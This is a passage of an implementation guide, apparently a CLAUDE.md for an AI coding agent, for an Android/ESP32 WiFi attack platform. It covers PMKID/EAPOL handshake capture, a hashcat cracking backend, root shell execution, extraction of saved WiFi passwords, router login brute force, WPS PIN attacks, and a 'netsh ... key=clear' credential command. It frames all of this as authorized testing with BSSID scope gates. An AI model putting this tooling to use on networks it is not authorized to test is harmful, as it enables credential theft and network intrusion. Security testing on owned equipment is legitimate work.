└─────────────────────────────────────────────────────────────────────┘
```

## 9.2 Component Integration

**Root Shell Executor**: Executes privileged commands via `su -c`.

```kotlin
object RootShell {
    suspend fun exec(command: String): Result<String> = withContext(Dispatchers.IO) {
        try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            val exitCode = process.waitFor()
            if (exitCode == 0) Result.success(output) else Result.failure(Exception(error))
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}
```

**Termux Integration**: Uses Termux:API or direct shell for CLI tools.

**ESP32 Integration** (optional): BLE connection for PMKID/EAPOL capture on devices without monitor mode support.

---

# 10. TESTING STRATEGY

## 10.1 Test Tiers

### Tier 0: Unit Tests (Synthetic)

Pure Kotlin/Python tests with mocked hardware:

**ESP32**:
- Frame parsing logic
- PMKID extraction from synthetic RSN IE
- EAPOL state machine transitions
- Hashcat record formatting

**Android**:
- `BleSnifferProtocol` frame parsing
- `OffensiveScopeGuard` authorization logic
- `CapturedHandshakeRepository` operations
- `CrackingBackendClient` request/response handling

**Backend**:
- Job submission validation
- Queue ordering
- Status transitions
- Result formatting

### Tier 1: Integration Tests (Controlled)

Real hardware with operator-owned testbed:

**Required Equipment**:
- ESP32-S3 with firmware
- Testbed router (operator-owned, WPA2-PSK)
- Android device with app
- Backend server

**Test Scenarios**:
1. **PMKID Capture**: Connect ESP32, configure authorized BSSID, verify PMKID capture
2. **EAPOL Capture**: Connect client to testbed, verify handshake capture
3. **End-to-End Cracking**: Submit known password, verify crack success
4. **Scope Enforcement**: Attempt to capture unauthorized BSSID, verify rejection

### Tier 2: Adversarial Tests (FP Prevention)

Tests that should find nothing:

1. **Out-of-Scope Rejection**: Configure ESP32 with empty authorized list, verify no captures transmitted
2. **Malformed Frame Rejection**: Send garbage data over BLE, verify graceful handling
3. **Backend Timeout**: Kill backend mid-job, verify Android handles gracefully
4. **Duplicate Deduplication**: Submit same capture twice, verify single job

## 10.2 Test Implementation

```kotlin
// core/data/src/test/java/com/alexcupsa/wifithermal/core/data/ble/BleSnifferProtocolTest.kt

class BleSnifferProtocolTest {
    
    @Test
    fun `parse valid PMKID frame`() {
        // Version 1, Kind PMKID, BSSID, SSID "TestNet", payload
        val frame = byteArrayOf(
            0x01,                                         // version
            0x01,                                         // kind = PMKID
            0xAA.toByte(), 0xBB.toByte(), 0xCC.toByte(),  // BSSID
            0xDD.toByte(), 0xEE.toByte(), 0xFF.toByte(),
            0x07,                                         // ssid_len
            'T'.code.toByte(), 'e'.code.toByte(),         // SSID
            's'.code.toByte(), 't'.code.toByte(),
            'N'.code.toByte(), 'e'.code.toByte(),
            't'.code.toByte(),
            0x10, 0x00,                                   // payload_len (16)
            // 16 bytes of payload
            *ByteArray(16) { it.toByte() }
        )
        
        val parsed = BleSnifferProtocol.parseFrame(frame)
        
        assertEquals("AA:BB:CC:DD:EE:FF", parsed.bssid)
        assertEquals("TestNet", parsed.ssid)
        assertEquals(BleSnifferProtocol.KIND_PMKID, parsed.kind)
        assertEquals(16, parsed.payload.size)
    }
    
    @Test
    fun `reject frame with unsupported version`() {
        val frame = byteArrayOf(0x99, 0x01, *ByteArray(20))
        
        assertThrows<CaptureError.UnsupportedVersion> {
            BleSnifferProtocol.parseFrame(frame)
        }
    }
    
    @Test
    fun `reject truncated frame`() {
        val frame = byteArrayOf(0x01, 0x01, 0xAA.toByte())  // Too short
        
        assertThrows<CaptureError.MalformedFrame> {
            BleSnifferProtocol.parseFrame(frame)
        }
    }
}

class OffensiveScopeGuardTest {
    
    private lateinit var scopeGuard: OffensiveScopeGuard
    private lateinit var mockRepository: AuthorizationManifestRepository
    
    @BeforeEach
    fun setup() {
        mockRepository = mockk()
        every { mockRepository.getAuthorizedBssids() } returns listOf(
            "AA:BB:CC:DD:EE:FF",
            "11:22:33:44:55:66",
        )
        scopeGuard = OffensiveScopeGuard(mockRepository)
    }
    
    @Test
    fun `authorize matching BSSID`() {
        assertTrue(scopeGuard.isAuthorized("AA:BB:CC:DD:EE:FF"))
        assertTrue(scopeGuard.isAuthorized("11:22:33:44:55:66"))
    }
    
    @Test
    fun `reject non-matching BSSID`() {
        assertFalse(scopeGuard.isAuthorized("99:99:99:99:99:99"))
        assertFalse(scopeGuard.isAuthorized("AA:BB:CC:DD:EE:00"))  // Close but not exact
    }
    
    @Test
    fun `reject all when list is empty`() {
        every { mockRepository.getAuthorizedBssids() } returns emptyList()
        scopeGuard = OffensiveScopeGuard(mockRepository)
        
        assertFalse(scopeGuard.isAuthorized("AA:BB:CC:DD:EE:FF"))
    }
    
    @Test
    fun `case insensitive matching`() {
        assertTrue(scopeGuard.isAuthorized("aa:bb:cc:dd:ee:ff"))
        assertTrue(scopeGuard.isAuthorized("AA:BB:CC:DD:EE:FF"))
        assertTrue(scopeGuard.isAuthorized("Aa:Bb:Cc:Dd:Ee:Ff"))
    }
}
```

---

# 11. SECURITY AND AUTHORIZATION

## 11.1 Defense in Depth

The system enforces authorization at four points:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    SCOPE ENFORCEMENT GATES                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  GATE 1: ESP32 Source Filter                                        │
│  ├─ WHERE: scope_filter.c::scope_filter_is_authorized()            │
│  ├─ WHEN: Every captured frame before BLE transmission             │
│  └─ EFFECT: Out-of-scope frames never leave the ESP32              │
│                                                                     │
│  GATE 2: Android BLE Ingest                                         │
│  ├─ WHERE: BleSnifferClient.kt::processCaptureFrame()               │
│  ├─ WHEN: Every frame received over BLE                             │
│  └─ EFFECT: Out-of-scope frames silently discarded                  │
│                                                                     │
│  GATE 3: Repository Insert                                          │
│  ├─ WHERE: CapturedHandshakeRepository.kt::insert()                 │
│  ├─ WHEN: Before database write                                     │
│  └─ EFFECT: Unauthorized captures rejected with ScopeError          │
│                                                                     │
│  GATE 4: Backend Submit                                             │
│  ├─ WHERE: CrackingBackendClient.kt::submitCapture()                │
│  ├─ WHEN: Before HTTP request                                       │
│  └─ EFFECT: Submission blocked, error logged                        │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

## 11.2 Authorization Manifest

```kotlin
// core/model/src/main/java/com/alexcupsa/wifithermal/core/model/audit/AuthorizationScope.kt

data class AuthorizationScope(
    val authorizedBssids: List<String>,     // Exact MAC addresses only
    val lastUpdated: Instant,
    val operatorName: String,
    val notes: String?,
) {
    init {
        // Validation: no wildcards, no prefixes, exact MAC only
        authorizedBssids.forEach { bssid ->
            require(bssid.matches(Regex("^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$"))) {
                "Invalid BSSID format: $bssid (must be XX:XX:XX:XX:XX:XX)"
            }
        }
    }
}
```

## 11.3 Legal Context

The AUTHORIZATION.md file documents:

- Operator identity
- Networks authorized for testing
- Legal context (Italian criminal code articles)
- Layer separation (A = passive, B = offensive)

**Critical**: Layer B operations are ONLY permitted on networks where the operator:
1. Physically owns the hardware (router/AP)
2. Has explicit written authorization from the owner
3. Has documented the authorization in the manifest

---

# 12. IMPLEMENTATION PHASES

## Phase 1: Root Shell Integration (1 week)

**Deliverables**:
- RootShell executor class (su -c wrapper)
- Root permission check on app launch
- Termux API detection and integration
- Saved password extraction from /data/misc/wifi/

**Verification**:
- Test on rooted device
- Verify password extraction works

## Phase 2: Vendor Keygen Engine (1 week)

**Deliverables**:
- Port wifi_keygen.py to Kotlin
- OUI to vendor mapping
- ISP-specific keygen algorithms (Fastweb, TIM, Vodafone, WindTre)
- Candidate generation UI

**Verification**:
- Test against known router BSSIDs
- Verify candidate generation matches Python version

## Phase 3: Router Admin Brute Force (1-2 weeks)

**Deliverables**:
- Gateway/router IP detection
- Login form auto-detection (HTML parsing)
- Credential brute force engine
- Rate limiting and lockout detection
- Default credential database

**Verification**:
- Test against home router
- Verify form detection works across router brands

## Phase 4: WPS PIN Attack (1 week)

**Deliverables**:
- WPS detection from scan results
- Monitor mode enable/disable (airmon-ng wrapper)
- Reaver/bully CLI integration
- Progress tracking and result parsing

**Verification**:
- Test on WPS-enabled router
- Verify PIN recovery works

## Phase 5: ESP32 Companion (optional, 2 weeks)

**Deliverables**:
- ESP32 firmware (already created in companion/)
- BLE connection from Android
- PMKID/EAPOL capture for devices without monitor mode

**Verification**:
- Flash ESP32, test BLE connection
- Verify capture transmission

## Phase 6: Cracking Integration (1 week)

**Deliverables**:
- Local crack via Termux hashcat
- Remote crack via SSH/SCP to VPS
- Progress monitoring and result retrieval
- Wordlist management

**Verification**:
- Crack known password locally and remotely

---

# 13. FILE-BY-FILE SPECIFICATIONS

## 13.1 ESP32 Files to Create

| File | Purpose | Lines (est) |
|------|---------|-------------|
| `main/main.c` | Application entry, init | 100 |
| `main/wifi_sniffer.c` | Promiscuous mode setup, channel hopping | 200 |
| `main/wifi_sniffer.h` | Public interface | 30 |
| `main/pmkid_extractor.c` | RSN IE parsing, PMKID extraction | 250 |
| `main/pmkid_extractor.h` | Public interface | 40 |
| `main/eapol_tracker.c` | 4-way handshake state machine | 350 |
| `main/eapol_tracker.h` | Public interface | 50 |
| `main/hashcat_formatter.c` | Build hashcat 22000 records | 150 |
| `main/hashcat_formatter.h` | Public interface | 30 |
| `main/ble_service.c` | BLE GATT server, notifications | 300 |
| `main/ble_service.h` | Public interface | 40 |
| `main/scope_filter.c` | BSSID authorization filter | 100 |
| `main/scope_filter.h` | Public interface | 20 |
| `main/config.h` | Build-time configuration | 50 |
| `CMakeLists.txt` | Build configuration | 30 |
| `sdkconfig.defaults` | ESP-IDF settings | 50 |

**Total ESP32**: ~1,790 lines

## 13.2 Android Files to Modify/Create

| File | Action | Changes |
|------|--------|---------|
| `core/data/ble/BleSnifferClient.kt` | MAJOR | Add real BLE implementation |
| `core/data/cracking/CrackingBackendClient.kt` | MAJOR | Add HTTP implementation |
| `core/data/repository/CapturedHandshakeRepository.kt` | MINOR | Add scope check at insert |
| `app/layerb/LayerBViewModel.kt` | MINOR | Wire to real client |
| `app/layerb/LayerBScreen.kt` | MINOR | Add status display |
| `core/model/audit/CapturedHandshake.kt` | MINOR | Add status enum |
| `core/data/di/DataModule.kt` | MINOR | Provide new dependencies |

## 13.3 Backend Files to Create

| File | Purpose | Lines (est) |
|------|---------|-------------|
| `api/main.py` | FastAPI application | 200 |
| `api/models.py` | Pydantic models | 100 |
| `api/routes/captures.py` | Capture endpoints | 150 |
| `api/routes/health.py` | Health check | 20 |
| `api/auth.py` | API key authentication | 50 |
| `worker/cracker.py` | Hashcat wrapper | 300 |
| `worker/queue.py` | Redis queue management | 100 |
| `worker/wordlists.py` | Wordlist management | 50 |
| `config/config.py` | Configuration loader | 80 |
| `docker/Dockerfile.api` | API container | 30 |
| `docker/Dockerfile.worker` | Worker container | 40 |
| `docker/docker-compose.yml` | Compose file | 80 |
| `requirements.txt` | Dependencies | 20 |

**Total Backend**: ~1,220 lines

## 13.4 Windows Companion Files

| File | Purpose | Lines (est) |
|------|---------|-------------|
| `wifi_extractor.py` | Main script | 200 |
| `wifi_extractor.bat` | Admin wrapper | 15 |
| `requirements.txt` | Dependencies | 5 |
| `config.json` | Configuration | 10 |
| `README.md` | Documentation | 100 |

**Total Windows**: ~330 lines

---

# 14. ERROR HANDLING AND ROBUSTNESS

## 14.1 Retry Policies

| Operation | Max Retries | Backoff | Timeout |
|-----------|-------------|---------|---------|
| BLE scan | 3 | Linear 5s | 10s per attempt |
| BLE connect | 3 | Exponential 1.5x | 30s per attempt |
| Backend submit | 5 | Exponential + jitter | 60s per attempt |
| Backend poll | N/A | Fixed 30s interval | 30s |

## 14.2 Offline Queue

When backend is unreachable:
1. Captures stored locally in Room DB
2. Status marked as `PENDING`
3. Background job retries every 15 minutes
4. Exponential backoff on repeated failures
5. Max queue size: 1000 captures (oldest dropped)

## 14.3 Graceful Degradation

| Scenario | Behavior |
|----------|----------|
| BLE unavailable | Layer B disabled, Layer A continues |
| ESP32 not found | UI shows instructions to power device |
| Backend unreachable | Queue locally, retry later |
| Cracking timeout | Mark as `TIMEOUT`, allow manual retry |
| Invalid capture | Log error, continue with other captures |

---

# 15. VERIFICATION AND VALIDATION

## 15.1 Pre-Deployment Checklist

**ESP32**:
- [ ] Promiscuous mode captures frames on all channels
- [ ] PMKID extracted from testbed router
- [ ] EAPOL handshake captured from client reconnection
- [ ] BLE service advertises correctly
- [ ] Authorized BSSIDs filter works
- [ ] Capture frames transmit to Android

**Android**:
- [ ] BLE connects to ESP32
- [ ] Capture frames parse correctly
- [ ] Scope guard rejects unauthorized
- [ ] Captures persist to Room DB
- [ ] Backend submission works
- [ ] Status polling works
- [ ] Cracked passwords display

**Backend**:
- [ ] API accepts submissions
- [ ] Jobs queue correctly
- [ ] Worker processes jobs
- [ ] Hashcat cracks known password
- [ ] Results return to Android

## 15.2 End-to-End Test Script

```bash
#!/bin/bash
# e2e_test.sh - Full end-to-end verification

echo "=== WF-Thermos End-to-End Test ==="

# 1. Verify ESP32 is advertising
echo "[1] Scanning for ESP32 sniffer..."
bluetoothctl scan on | grep -q "WF-Sniffer" || { echo "FAIL: ESP32 not found"; exit 1; }
echo "PASS: ESP32 found"

# 2. Verify backend is reachable
echo "[2] Checking backend health..."
curl -s https://$BACKEND_URL/api/v1/health | grep -q "healthy" || { echo "FAIL: Backend unreachable"; exit 1; }
echo "PASS: Backend healthy"

# 3. Submit test capture (known password)
echo "[3] Submitting test capture..."
JOB_ID=$(curl -s -X POST https://$BACKEND_URL/api/v1/captures \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $API_KEY" \
  -d '{"bssid":"AA:BB:CC:DD:EE:FF","ssid":"TestNet","capture_type":"pmkid","hashcat_record":"WPA*02*...*00","priority":"high","wordlists":["test"],"rules":[],"timeout_hours":1}' \
  | jq -r '.job_id')
echo "Job ID: $JOB_ID"

# 4. Wait for completion
echo "[4] Waiting for cracking..."
for i in {1..60}; do
  STATUS=$(curl -s https://$BACKEND_URL/api/v1/captures/$JOB_ID -H "X-API-Key: $API_KEY" | jq -r '.status')
  if [[ "$STATUS" == "cracked" ]]; then
    echo "PASS: Password cracked"
    break
  elif [[ "$STATUS" == "exhausted" || "$STATUS" == "error" ]]; then
    echo "FAIL: Cracking failed ($STATUS)"
    exit 1
  fi
  sleep 5
done

# 5. Retrieve result
echo "[5] Retrieving result..."
PASSWORD=$(curl -s https://$BACKEND_URL/api/v1/captures/$JOB_ID/result -H "X-API-Key: $API_KEY" | jq -r '.password')
if [[ "$PASSWORD" == "testpassword123" ]]; then
  echo "PASS: Correct password retrieved"
else
  echo "FAIL: Wrong password ($PASSWORD)"
  exit 1
fi

echo "=== ALL TESTS PASSED ==="
```

---

# 16. OPERATIONAL PROCEDURES

## 16.1 Field Operation Workflow

```
BEFORE OPERATION:
1. Verify testbed router is in authorized BSSID list
2. Charge phone and ESP32
3. Verify Tailscale is connected
4. Verify backend is reachable

DURING OPERATION:
1. Power on ESP32
2. Open app, navigate to Layer B
3. Tap "Connect to Sniffer"
4. Wait for BLE connection
5. Verify authorized BSSIDs sent to ESP32
6. Monitor captures in real-time
7. For PMKID: ESP32 auto-captures from beacons
8. For EAPOL: Wait for client reconnection

AFTER OPERATION:
1. Check submission status
2. Wait for cracking results
3. Document findings
4. Power off ESP32
```

## 16.2 Troubleshooting Guide

| Problem | Cause | Solution |
|---------|-------|----------|
| ESP32 not found | Not powered / not advertising | Power cycle, check BLE |
| No captures | Wrong channel / out of range | Move closer, verify BSSID |
| Scope rejection | BSSID not authorized | Add to manifest |
| Backend timeout | Network issue | Check Tailscale, retry |
| Cracking exhausted | Password not in wordlist | Try larger wordlist / rules |

## 16.3 Maintenance

**Weekly**:
- Update wordlists with new leaks
- Check backend disk space
- Review incident logs

**Monthly**:
- Update ESP32 firmware if changed
- Update Android app
- Rotate API keys

---

# APPENDIX A: REFERENCE MATERIALS

## A.1 WiFi Protocol References

- IEEE 802.11-2020 Standard
- WPA3 SAE (Dragonfly) specification
- hcxtools PMKID format: https://github.com/ZerBea/hcxtools
- Hashcat mode 22000: https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2

## A.2 ESP-IDF Resources

- ESP-IDF Programming Guide: https://docs.espressif.com/projects/esp-idf/en/stable/esp32/
- esp_wifi promiscuous API: https://docs.espressif.com/projects/esp-idf/en/stable/esp32/api-reference/network/esp_wifi.html
- NimBLE GATT Server: https://mynewt.apache.org/latest/network/ble_hs/ble_hs.html

## A.3 Android BLE Resources

- Android BLE Overview: https://developer.android.com/guide/topics/connectivity/bluetooth/ble-overview
- GATT operations: https://developer.android.com/guide/topics/connectivity/bluetooth/connect-gatt-server

---

# APPENDIX B: KNOWLEDGE FROM PERSONAL-RESOURCES

## B.1 WiFi Password Extraction Commands

From `03-WINDOWS-POWERUSER/14-batch-scripting.md`:
```batch
netsh wlan show profiles
netsh wlan show profile name="NomeRete" key=clear
```

## B.2 WPA2 4-Way Handshake Mechanics

From `15-SECURITY/domain9_chapter9B_l2_wireless_telecom_sdn.md`:

1. **M1 (AP → Client)**: ANonce, no MIC
2. **M2 (Client → AP)**: SNonce, MIC (proving client knows PMK)
3. **M3 (AP → Client)**: ANonce again, GTK, MIC
4. **M4 (Client → AP)**: ACK, MIC

**PMKID** = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)

## B.3 Hashcat Attack Modes

From `12-SOFTWARE-ENGINEERING-EXTRA/04_Security_Cryptography/15_Wireless_IoT_Security.md`:

- `-a 0`: Dictionary attack
- `-a 3`: Brute-force mask attack
- `-a 6`: Hybrid wordlist + mask
- `-a 7`: Hybrid mask + wordlist

---

**END OF DOCUMENT**

*This CLAUDE.md serves as the permanent implementation guide for completing the wf-thermos-eye platform. Every implementation decision must align with this document. Updates should be tracked with version increments.*
